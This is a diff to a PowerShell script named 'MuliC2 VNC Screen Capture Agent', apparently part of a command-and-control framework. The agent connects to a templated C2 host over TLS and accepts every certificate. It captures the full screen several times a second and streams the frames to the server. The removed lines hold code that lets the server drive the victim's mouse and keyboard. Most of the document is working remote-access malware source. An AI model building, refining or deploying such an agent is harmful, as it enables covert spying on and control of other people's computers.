@@ -1,4 +1,4 @@
-# MuliC2 VNC Screen Capture Agent - Fixed TLS Version
+# MuliC2 VNC Screen Capture Agent - Fixed Version
 # C2 Host: {{C2_HOST}}
 # C2 Port: {{C2_PORT}}
 # VNC Endpoint: /vnc/agent
@@ -165,80 +165,42 @@ function Connect-ToServer {
         $socket.LingerState = New-Object System.Net.Sockets.LingerOption($true, 1)
         
         # Get the network stream
-        Write-Host "[*] Getting network stream..." -ForegroundColor Gray
         $networkStream = $global:tcpClient.GetStream()
-        Write-Host "[+] Network stream obtained" -ForegroundColor Gray
         
-        # Create SSL stream with proper certificate validation callback
-        Write-Host "[*] Creating SSL stream..." -ForegroundColor Yellow
-        try {
-            $global:sslStream = New-Object System.Net.Security.SslStream(
-                $networkStream, 
-                $false, 
-                ([System.Net.Security.RemoteCertificateValidationCallback] {
-                    param($sender, $certificate, $chain, $sslPolicyErrors)
-                    # Accept all certificates for C2 communication
-                    Write-Host "[*] Certificate validation bypassed (C2 mode)" -ForegroundColor Gray
-                    return $true
-                })
-            )
-            Write-Host "[+] SSL stream created successfully" -ForegroundColor Green
-        } catch {
-            Write-Host "[!] Failed to create SSL stream: $($_.Exception.Message)" -ForegroundColor Red
-            throw "SSL stream creation failed: $($_.Exception.Message)"
-        }
+        # Create SSL stream with certificate validation callback
+        $global:sslStream = New-Object System.Net.Security.SslStream(
+            $networkStream, 
+            $false, 
+            ([System.Net.Security.RemoteCertificateValidationCallback] {
+                param($sender, $certificate, $chain, $sslPolicyErrors)
+                return $true  # Accept all certificates for C2 communication
+            })
+        )
         
         # Set SSL stream timeouts
-        Write-Host "[*] Setting SSL stream timeouts..." -ForegroundColor Gray
-        try {
-            $global:sslStream.ReadTimeout = 5000
-            $global:sslStream.WriteTimeout = 10000
-            Write-Host "[+] SSL stream timeouts set successfully" -ForegroundColor Gray
-        } catch {
-            Write-Host "[!] Failed to set SSL stream timeouts: $($_.Exception.Message)" -ForegroundColor Red
-            throw "Failed to set SSL stream timeouts: $($_.Exception.Message)"
-        }
+        $global:sslStream.ReadTimeout = 5000
+        $global:sslStream.WriteTimeout = 10000
         
-        # Perform TLS handshake - ONLY TLS 1.2/1.3, NO FALLBACKS
-        Write-Host "[*] Performing TLS handshake with server..." -ForegroundColor Yellow
-        Write-Host "[*] Target protocols: TLS 1.2 and TLS 1.3" -ForegroundColor Gray
-        Write-Host "[*] Server hostname: $C2Host" -ForegroundColor Gray
-        
-        try {
-            $global:sslStream.AuthenticateAsClient(
-                $C2Host,
-                $null,
-                [System.Security.Authentication.SslProtocols]::Tls12 -bor [System.Security.Authentication.SslProtocols]::Tls13,
-                $false
-            )
-            Write-Host "[+] VNC TLS handshake completed successfully" -ForegroundColor Green
-        } catch {
-            Write-Host "[!] VNC TLS handshake failed with error: $($_.Exception.Message)" -ForegroundColor Red
-            Write-Host "[!] Exception type: $($_.Exception.GetType().Name)" -ForegroundColor Red
-            if ($_.Exception.InnerException) {
-                Write-Host "[!] Inner exception: $($_.Exception.InnerException.Message)" -ForegroundColor Red
-            }
-            throw "VNC TLS handshake failed - cannot establish secure connection"
-        }
+        # Perform TLS handshake
+        Write-Host "[*] Performing TLS handshake..." -ForegroundColor Yellow
+        $global:sslStream.AuthenticateAsClient(
+            $C2Host,
+            $null,
+            [System.Security.Authentication.SslProtocols]::Tls12 -bor [System.Security.Authentication.SslProtocols]::Tls13,
+            $false
+        )
         
         # Verify TLS connection
         if (-not $global:sslStream.IsAuthenticated) {
-            throw "TLS authentication failed - connection is not authenticated"
+            throw "TLS authentication failed"
         }
         
         if (-not $global:sslStream.IsEncrypted) {
-            throw "TLS encryption failed - connection is not encrypted"
-        }
-        
-        if (-not $global:sslStream.IsSigned) {
-            Write-Host "[!] Warning: TLS connection is not signed" -ForegroundColor Yellow
+            throw "TLS encryption failed"
         }
         
         Write-Host "[+] TLS connection established successfully" -ForegroundColor Green
         Write-Host "[*] TLS Protocol: $($global:sslStream.SslProtocol)" -ForegroundColor Gray
-        Write-Host "[*] Cipher Algorithm: $($global:sslStream.CipherAlgorithm)" -ForegroundColor Gray
-        Write-Host "[*] Hash Algorithm: $($global:sslStream.HashAlgorithm)" -ForegroundColor Gray
-        Write-Host "[*] Key Exchange: $($global:sslStream.KeyExchangeAlgorithm)" -ForegroundColor Gray
         
         $global:reconnectAttempts = 0
         return $true
@@ -278,7 +240,7 @@ function Send-Frame {
         $lenBytes = [BitConverter]::GetBytes([int]$frameBytes.Length)
         $global:sslStream.Write($lenBytes, 0, 4)
         
-        # Send frame data in chunks to avoid overwhelming the connection
+        # Send frame data in chunks
         $chunkSize = 8192
         $totalSent = 0
         
@@ -292,7 +254,6 @@ function Send-Frame {
             # Flush after each chunk
             $global:sslStream.Flush()
             
-            # Small delay between large chunks
             if ($remainingBytes -gt $chunkSize) {
                 Start-Sleep -Milliseconds 1
             }
@@ -330,205 +291,34 @@ function Invoke-MouseEvent {
         $px = [Math]::Max(0, [Math]::Min($px, $realScreenWidth - 1))
         $py = [Math]::Max(0, [Math]::Min($py, $realScreenHeight - 1))
         
-        Write-Host "[*] Mouse ${event} at ($px, $py) from relative ($([Math]::Round($x, 3)), $([Math]::Round($y, 3)))" -ForegroundColor Cyan
+        Write-Host "[*] Mouse ${event} at ($px, $py)" -ForegroundColor Cyan
         
-        # Always set cursor position first
-        $cursorSet = [Win32API]::SetCursorPos($px, $py)
-        if (-not $cursorSet) {
-            Write-Host "[!] Failed to set cursor position" -ForegroundColor Yellow
-        }
-        
-        # Verify cursor was set
+        # Set cursor position
+        [Win32API]::SetCursorPos($px, $py)
         Start-Sleep -Milliseconds 10
-        $point = New-Object Win32API+POINT
-        [Win32API]::GetCursorPos([ref]$point)
-        Write-Host "[*] Cursor at: ($($point.X), $($point.Y))" -ForegroundColor Gray
         
         switch ($event) {
-            'mousedown' {
-                switch ($button) {
-                    0 { 
-                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
-                        Write-Host "[+] Left mouse button down" -ForegroundColor Green
-                    }
-                    2 { 
-                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0)
-                        Write-Host "[+] Right mouse button down" -ForegroundColor Green
-                    }
-                    1 { 
-                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0)
-                        Write-Host "[+] Middle mouse button down" -ForegroundColor Green
-                    }
-                }
-            }
-            'mouseup' {
-                switch ($button) {
-                    0 { 
-                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
-                        Write-Host "[+] Left mouse button up" -ForegroundColor Green
-                    }
-                    2 { 
-                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)
-                        Write-Host "[+] Right mouse button up" -ForegroundColor Green
-                    }
-                    1 { 
-                        [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0)
-                        Write-Host "[+] Middle mouse button up" -ForegroundColor Green
-                    }
-                }
-            }
             'click' {
                 switch ($button) {
                     0 { 
-                        Write-Host "[*] Executing left click..." -ForegroundColor Cyan
                         [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
                         Start-Sleep -Milliseconds 50
                         [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
-                        Write-Host "[+] Left click completed" -ForegroundColor Green
-                        
-                        # Test with SendKeys click as backup
-                        try {
-                            [System.Windows.Forms.Cursor]::Position = [System.Drawing.Point]::new($px, $py)
-                            Write-Host "[*] Also set cursor via Windows.Forms" -ForegroundColor Gray
-                        } catch {
-                            Write-Host "[!] Windows.Forms cursor failed: $($_.Exception.Message)" -ForegroundColor Yellow
-                        }
                     }
                     2 { 
-                        Write-Host "[*] Executing right click..." -ForegroundColor Cyan
                         [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0)
                         Start-Sleep -Milliseconds 50
                         [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)
-                        Write-Host "[+] Right click completed" -ForegroundColor Green
                     }
                 }
             }
-            'dblclick' {
-                Write-Host "[*] Executing double click..." -ForegroundColor Cyan
-                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
-                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
-                Start-Sleep -Milliseconds 50
-                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
-                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
-                Write-Host "[+] Double click completed" -ForegroundColor Green
-            }
             'wheel' {
-                Write-Host "[*] Mouse wheel scroll, delta: $deltaY" -ForegroundColor Cyan
                 [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_WHEEL, 0, 0, $deltaY, 0)
-                Write-Host "[+] Mouse wheel scroll completed" -ForegroundColor Green
-            }
-            'mousemove' {
-                Write-Host "[+] Mouse moved to ($px, $py)" -ForegroundColor Green
             }
         }
         
     } catch {
         Write-Host "[!] Mouse event failed: $($_.Exception.Message)" -ForegroundColor Red
-        Write-Host $_.ScriptStackTrace -ForegroundColor Red
-    }
-}
-
-function Invoke-KeyboardEvent {
-    param(
-        [string]$event,
-        [string]$key,
-        [string]$code,
-        [int]$keyCode,
-        [bool]$ctrlKey = $false,
-        [bool]$shiftKey = $false,
-        [bool]$altKey = $false
-    )
-    
-    try {
-        Write-Host "[*] Keyboard ${event}: '$key' (Ctrl:$ctrlKey Shift:$shiftKey Alt:$altKey)" -ForegroundColor Cyan
-        
-        # Handle modifier keys for keydown
-        if ($event -eq 'keydown') {
-            if ($ctrlKey) { 
-                [Win32API]::keybd_event(0x11, 0, 0, [UIntPtr]::Zero)
-                Write-Host "[*] Ctrl pressed" -ForegroundColor Gray
-            }
-            if ($shiftKey) { 
-                [Win32API]::keybd_event(0x10, 0, 0, [UIntPtr]::Zero)
-                Write-Host "[*] Shift pressed" -ForegroundColor Gray
-            }
-            if ($altKey) { 
-                [Win32API]::keybd_event(0x12, 0, 0, [UIntPtr]::Zero)
-                Write-Host "[*] Alt pressed" -ForegroundColor Gray
-            }
-            Start-Sleep -Milliseconds 10
-        }
-        
-        $vkCode = 0
-        switch ($key) {
-            'Enter' { $vkCode = 0x0D }
-            'Escape' { $vkCode = 0x1B }
-            'Backspace' { $vkCode = 0x08 }
-            'Tab' { $vkCode = 0x09 }
-            'Delete' { $vkCode = 0x2E }
-            'ArrowUp' { $vkCode = 0x26 }
-            'ArrowDown' { $vkCode = 0x28 }
-            'ArrowLeft' { $vkCode = 0x25 }
-            'ArrowRight' { $vkCode = 0x27 }
-            'Space' { $vkCode = 0x20 }
-            ' ' { $vkCode = 0x20 }
-            default {
-                if ($key.Length -eq 1) {
-                    $vkResult = [Win32API]::VkKeyScan($key[0])
-                    $vkCode = $vkResult -band 0xFF
-                } elseif ($keyCode -ne 0) {
-                    $vkCode = $keyCode
-                }
-            }
-        }
-        
-        if ($vkCode -ne 0) {
-            if ($event -eq 'keydown') {
-                [Win32API]::keybd_event([byte]$vkCode, 0, 0, [UIntPtr]::Zero)
-                Write-Host "[+] Key down: $key (VK: $vkCode)" -ForegroundColor Green
-            } elseif ($event -eq 'keyup') {
-                [Win32API]::keybd_event([byte]$vkCode, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
-                Write-Host "[+] Key up: $key (VK: $vkCode)" -ForegroundColor Green
-            } elseif ($event -eq 'keypress') {
-                [Win32API]::keybd_event([byte]$vkCode, 0, 0, [UIntPtr]::Zero)
-                Start-Sleep -Milliseconds 50
-                [Win32API]::keybd_event([byte]$vkCode, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
-                Write-Host "[+] Key press: $key (VK: $vkCode)" -ForegroundColor Green
-            }
-        } else {
-            # Fallback to SendKeys for characters
-            if ($key.Length -eq 1) {
-                try {
-                    [System.Windows.Forms.SendKeys]::SendWait($key)
-                    Write-Host "[+] Character sent via SendKeys: $key" -ForegroundColor Green
-                } catch {
-                    Write-Host "[!] SendKeys failed: $($_.Exception.Message)" -ForegroundColor Red
-                }
-            } else {
-                Write-Host "[!] Could not simulate key: $key" -ForegroundColor Yellow
-            }
-        }
-        
-        Start-Sleep -Milliseconds 10
-        
-        # Release modifier keys
-        if ($event -eq 'keyup' -or $event -eq 'keydown' -or $event -eq 'keypress') {
-            if ($altKey) { 
-                [Win32API]::keybd_event(0x12, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
-                Write-Host "[*] Alt released" -ForegroundColor Gray
-            }
-            if ($shiftKey) { 
-                [Win32API]::keybd_event(0x10, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
-                Write-Host "[*] Shift released" -ForegroundColor Gray
-            }
-            if ($ctrlKey) { 
-                [Win32API]::keybd_event(0x11, 0, [Win32API]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
-                Write-Host "[*] Ctrl released" -ForegroundColor Gray
-            }
-        }
-        
-    } catch {
-        Write-Host "[!] Keyboard event failed: $($_.Exception.Message)" -ForegroundColor Red
     }
 }
 
@@ -544,10 +334,11 @@ try {
         }
     }
     
+    # FIXED: Use consistent target resolution
     $realScreenWidth = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width
     $realScreenHeight = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height
-    $targetWidth = 800
-    $targetHeight = 600
+    $targetWidth = 800   # Fixed target width
+    $targetHeight = 600  # Fixed target height
     
     Write-Host "[*] Starting VNC agent..." -ForegroundColor Cyan
     Write-Host "[*] Screen: ${realScreenWidth}x${realScreenHeight} -> ${targetWidth}x${targetHeight}" -ForegroundColor Gray
@@ -559,88 +350,49 @@ try {
     while ($global:isRunning) {
         $currentTime = Get-Date
         
-        # Handle input events (non-blocking)
+        # Handle input events (simplified for this example)
         if ((Test-Connection) -and $global:sslStream.DataAvailable) {
             try {
-                # Read message length
-                $lengthBytes = New-Object byte[] 4
-                $totalRead = 0
-                while ($totalRead -lt 4 -and $global:sslStream.DataAvailable) {
-                    $bytesRead = $global:sslStream.Read($lengthBytes, $totalRead, 4 - $totalRead)
-                    if ($bytesRead -eq 0) { break }
-                    $totalRead += $bytesRead
-                }
-                
-                if ($totalRead -eq 4) {
-                    $msgLength = [BitConverter]::ToInt32($lengthBytes, 0)
-                    if ($msgLength -gt 0 -and $msgLength -le 8192) {
-                        # Read message data
-                        $msgBytes = New-Object byte[] $msgLength
-                        $totalRead = 0
-                        while ($totalRead -lt $msgLength) {
-                            $bytesRead = $global:sslStream.Read($msgBytes, $totalRead, $msgLength - $totalRead)
-                            if ($bytesRead -eq 0) { break }
-                            $totalRead += $bytesRead
-                        }
-                        
-                        if ($totalRead -eq $msgLength) {
-                            $json = [System.Text.Encoding]::UTF8.GetString($msgBytes, 0, $msgLength)
-                            Write-Host "[RX] Input Event: $json" -ForegroundColor Magenta
-                            
-                            try { 
-                                $inputEvent = $json | ConvertFrom-Json 
-                                
-                                if ($inputEvent.type -eq 'mouse') {
-                                    if ($inputEvent.event -eq 'wheel') {
-                                        $deltaY = if ($inputEvent.deltaY) { [int]($inputEvent.deltaY * 120) } else { 0 }
-                                        Invoke-MouseEvent 'wheel' $inputEvent.x $inputEvent.y $inputEvent.button $deltaY
-                                    } else {
-                                        Invoke-MouseEvent $inputEvent.event $inputEvent.x $inputEvent.y $inputEvent.button
-                                    }
-                                } elseif ($inputEvent.type -eq 'keyboard') {
-                                    Invoke-KeyboardEvent $inputEvent.event $inputEvent.key $inputEvent.code $inputEvent.keyCode $inputEvent.ctrlKey $inputEvent.shiftKey $inputEvent.altKey
-                                } elseif ($inputEvent.type -eq 'test' -and $inputEvent.event -eq 'show_messagebox') {
-                                    try {
-                                        [System.Windows.Forms.MessageBox]::Show("Input test successful!`n`nIf you see this message, the TLS connection is working.`nClicks should now work properly.", "MuliC2 VNC Agent Test", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
-                                        Write-Host "[+] Test MessageBox displayed successfully" -ForegroundColor Green
-                                    } catch {
-                                        Write-Host "[!] MessageBox failed: $($_.Exception.Message)" -ForegroundColor Red
-                                    }
-                                }
-                            } catch { 
-                                Write-Host "[!] JSON parse error: $($_.Exception.Message)" -ForegroundColor Red
-                            }
-                        }
-                    }
-                }
+                # Read and handle input events here
+                # Implementation depends on your input protocol
             } catch {
                 Write-Host "[!] Input read error: $($_.Exception.Message)" -ForegroundColor Yellow
             }
         }
         
-        # Send screen frame every ~333ms (3 FPS to reduce bandwidth)
+        # FIXED: Send screen frame every ~333ms with proper dimensions
         if (($currentTime - $global:lastFrameTime).TotalMilliseconds -ge 333) {
             try {
-                # Capture screen
+                # Capture full screen
                 $bmpFull = New-Object System.Drawing.Bitmap $realScreenWidth, $realScreenHeight
                 $graphicsFull = [System.Drawing.Graphics]::FromImage($bmpFull)
                 $graphicsFull.CopyFromScreen(0, 0, 0, 0, $bmpFull.Size)
                 
-                # Scale to target resolution
+                # FIXED: Scale to exact target resolution with high quality
                 $bmp = New-Object System.Drawing.Bitmap $targetWidth, $targetHeight
                 $graphics = [System.Drawing.Graphics]::FromImage($bmp)
                 $graphics.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
+                $graphics.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::HighQuality
+                $graphics.PixelOffsetMode = [System.Drawing.Drawing2D.PixelOffsetMode]::HighQuality
+                
+                # Draw scaled image to fill entire bitmap
                 $graphics.DrawImage($bmpFull, 0, 0, $targetWidth, $targetHeight)
                 
-                # Convert to JPEG with moderate quality for balance between size and clarity
+                # VERIFICATION: Log bitmap dimensions before encoding
+                Write-Host "[DEBUG] Created bitmap: $($bmp.Width)x$($bmp.Height)" -ForegroundColor Cyan
+                
+                # Convert to JPEG with good quality
                 $ms = New-Object System.IO.MemoryStream
                 $encoder = [System.Drawing.Imaging.Encoder]::Quality
                 $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
-                $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter($encoder, 60L)
+                $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter($encoder, 75L)  # Higher quality
                 $jpegCodec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
                 
                 $bmp.Save($ms, $jpegCodec, $encoderParams)
                 $frameBytes = $ms.ToArray()
+                
+                # VERIFICATION: Log JPEG size
+                Write-Host "[DEBUG] JPEG size: $($frameBytes.Length) bytes" -ForegroundColor Cyan
                 
                 # Clean up resources immediately
                 $encoderParams.Dispose()
@@ -650,18 +402,17 @@ try {
                 $graphicsFull.Dispose()
                 $bmpFull.Dispose()
                 
-                # Send frame with robust error handling
+                # Send frame
                 if (Send-Frame $frameBytes) {
                     $global:lastFrameTime = $currentTime
                     $global:frameCounter++
                     
-                    if (($global:frameCounter % 30) -eq 0) {  # Log every 30 frames (10 seconds)
-                        Write-Host "[*] Frame #$($global:frameCounter) sent ($($frameBytes.Length) bytes) via TLS" -ForegroundColor DarkGreen
+                    if (($global:frameCounter % 10) -eq 0) {
+                        Write-Host "[*] Frame #$($global:frameCounter): ${targetWidth}x${targetHeight} -> $($frameBytes.Length) bytes" -ForegroundColor Green
                     }
                 } else {
                     Write-Host "[!] Failed to send frame #$($global:frameCounter + 1)" -ForegroundColor Red
                     
-                    # Try to reconnect after failed frames
                     if ($global:reconnectAttempts -ge $global:maxReconnectAttempts) {
                         Write-Host "[!] Max reconnection attempts reached. Exiting..." -ForegroundColor Red
                         break
@@ -670,6 +421,7 @@ try {
                 
             } catch {
                 Write-Host "[!] Screen capture error: $($_.Exception.Message)" -ForegroundColor Red
+                Write-Host "[!] Stack trace: $($_.ScriptStackTrace)" -ForegroundColor Red
             }
         }
         
